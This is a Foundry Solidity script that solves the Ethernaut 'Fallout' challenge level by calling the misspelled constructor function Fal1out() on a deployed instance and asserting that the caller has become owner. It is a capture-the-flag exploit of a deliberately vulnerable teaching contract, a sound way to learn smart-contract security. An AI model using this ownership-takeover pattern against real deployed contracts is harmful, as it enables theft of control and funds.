pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;
import "../instances/Ilevel02.sol";
import "forge-std/Script.sol";

contract Level02 is Script {
    Fallout level02 =
        Fallout(payable(0xfD595A3b25319BD8E614DbaeA50fEBAb1553b6a8));

    function run() external {
        uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY");
        address attacker = vm.addr(attackerPrivateKey);
        vm.startBroadcast(attackerPrivateKey);
        level02.Fal1out();
        require(level02.owner() == attacker, "owner not attacker");
        vm.stopBroadcast();
    }
}
